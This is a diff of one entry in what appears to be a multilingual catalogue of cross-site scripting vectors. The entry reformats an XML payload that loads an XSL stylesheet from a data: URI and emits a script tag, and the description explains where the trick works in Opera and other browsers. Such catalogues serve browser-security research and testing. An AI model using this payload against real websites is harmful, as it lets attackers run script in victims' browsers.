@@ -2079,7 +2079,7 @@ var items =
             'ru' : 'Вызов javascript из тега xml-stylesheet в Opera',
             'de' : ''
         },
-        'data'       : '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E %js_alert% %3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><html></html>',
+        'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<html></html>',
         'description': {
 	    'en' : 'Opera support xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
             'ja' : '',
